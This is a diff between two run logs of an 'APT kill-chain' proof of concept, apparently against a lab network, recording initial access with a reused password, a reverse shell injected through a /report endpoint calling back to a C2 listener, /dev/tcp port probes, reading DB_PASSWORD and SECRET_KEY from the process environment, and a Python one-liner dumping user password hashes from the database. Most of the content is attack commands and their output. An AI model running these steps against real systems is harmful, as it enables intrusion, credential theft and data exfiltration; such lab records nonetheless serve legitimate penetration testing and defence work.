@@ -1,29 +1,31 @@
-# APT kill-chain PoC  2026-11-18T18:29:34.669341+00:00
-[18:29:34] C2 listener on 0.0.0.0:443, waiting for api-01 to call back...
-[18:29:35] STAGE 1  initial access: logged in as 'bob' (reused credential) -> session=eyJ1c2VyIjoiYm9iIn0.av3ujw.Yw3EqP4L4Omr8Y-HBTHywVY1Cm8
-[18:29:35] STAGE 2  injecting reverse shell via /report  (sensor=<91 bytes>)
-[18:29:35] STAGE 2  /report returned; shell should be dialing back
-[18:29:35] C2  reverse shell connected from 10.10.1.21:49684
-[18:29:35] STAGE 3  discovery (foothold identity + blocked recon)
+# APT kill-chain PoC  2026-11-19T01:32:57.780142+00:00
+[01:32:57] C2 listener on 0.0.0.0:443, waiting for api-01 to call back...
+[01:32:58] STAGE 1  initial access: logged in as 'bob' (reused credential) -> session=eyJ1c2VyIjoiYm9iIn0.av5Ryg.pdlPinLeuHszhVVhNyY_ywquIXc
+[01:32:58] STAGE 2  injecting reverse shell via /report  (sensor=<91 bytes>)
+[01:32:58] STAGE 2  /report returned; shell should be dialing back
+[01:32:58] C2  reverse shell connected from 10.10.1.22:60270
+[01:32:58] STAGE 3  discovery (foothold identity + blocked recon)
     $ id; hostname; echo cwd=$PWD
       uid=999(ssle) gid=999(ssle) groups=999(ssle)
-      api-01
+      api-02
       cwd=/opt/ssle-api
-    $ timeout 3 bash -c 'echo > /dev/tcp/10.10.1.41/22' 2>&1; echo 'probe db-01:22 rc='$?  '(124=dropped by firewall)'
-      probe db-01:22 rc=124 (124=dropped by firewall)
-[18:29:38] STAGE 4  credential access (read DB_PASSWORD from the process env)
+    $ timeout 3 bash -c 'echo > /dev/tcp/10.10.0.10/22' 2>&1; echo 'probe 10.10.0.10:22 rc='$? '(124=dropped by firewall)'
+      probe 10.10.0.10:22 rc=124 (124=dropped by firewall)
+    $ timeout 3 bash -c 'echo > /dev/tcp/10.10.0.20/22' 2>&1; echo 'probe 10.10.0.20:22 rc='$? '(124=dropped by firewall)'
+      probe 10.10.0.20:22 rc=124 (124=dropped by firewall)
+[01:33:04] STAGE 4  credential access (read DB_PASSWORD from the process env)
     $ cat /proc/self/environ | tr '\0' '\n' | grep -E 'DB_|SECRET'
       DB_PASSWORD=11e3f18b7d2e2d96b21f9387b57ed661
       DB_USER=api
       SECRET_KEY=f7f916dde0ef69d5a8c29d4371c5247d4bf8b3782216678391637a3f6cbd201d
       DB_HOST=db-01.avr.pt.ssle
       DB_NAME=ssle
-[18:29:38] STAGE 4  captured DB_PASSWORD = 11e3f18b7d2e2d96b21f9387b57ed661
-[18:29:38] STAGE 5  collection/exfil (api-01 -> db-01, dump users + readings)
+[01:33:05] STAGE 4  captured DB_PASSWORD = 11e3f18b7d2e2d96b21f9387b57ed661
+[01:33:05] STAGE 5  collection/exfil (api-01 -> db-01, dump users + readings)
     $ python3 -c "import psycopg2;c=psycopg2.connect(host='db-01.avr.pt.ssle',dbname='ssle',user='api',password='11e3f18b7d2e2d96b21f9387b57ed661');cur=c.cursor();cur.execute('select current_user, inet_server_addr()');print('connected as',cur.fetchone());cur.execute('select username,left(password_hash,30)||chr(8230) from users order by username');[print(' ',r[0],r[1]) for r in cur.fetchall()];cur.execute('select count(*) from readings');print('readings rows:',cur.fetchone()[0])"
       connected as ('api', '10.10.1.41')
         alice pbkdf2:sha256:260000$2SYQyI2rB…
         bob pbkdf2:sha256:260000$2SgqVvuEW…
         carol pbkdf2:sha256:260000$udwDYurhI…
       readings rows: 1
-[18:29:39] chain complete
+[01:33:05] chain complete
